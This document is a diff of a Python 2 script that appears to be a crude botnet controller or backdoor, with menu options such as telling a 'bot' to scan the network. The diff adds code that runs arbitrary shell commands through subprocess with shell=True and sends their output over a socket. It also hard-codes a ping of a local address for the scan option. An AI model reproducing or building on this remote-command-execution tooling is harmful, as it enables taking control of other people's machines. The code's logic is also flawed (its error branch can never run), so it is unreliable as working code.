@@ -1,5 +1,6 @@
 import socket
 import threading
+import subprocess
 from xml.dom import minidom
 
 bind_host = '0.0.0.0'
@@ -133,8 +134,18 @@ def send_cmd(cmd):
     # connect the client
     client.connect((send_host, send_port))
 
-    # send some data
-    client.send(cmd)
+    op = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+
+    if op:
+        output = str(op.stdout.read())
+        print "Output:", output
+        client.sendall(output)
+    else:
+        error = str(op.stderr.read())
+        print "Error:", error
+        client.sendall(error)
+        # send some data
+        # client.send(cmd)
 
 
 def send_file(the_file):
@@ -247,7 +258,8 @@ while True:
         # TODO MAKE THIS WORK
 
     elif select == 4:  # Tell bot to Scan network
-        send_cmd('[*-->ping')
+        send_cmd('ping 192.168.0.11')
+        # send_cmd('[*-->ping')
         # TODO MAKE THIS WORK
 
     elif select == 5:  # Exit the Script
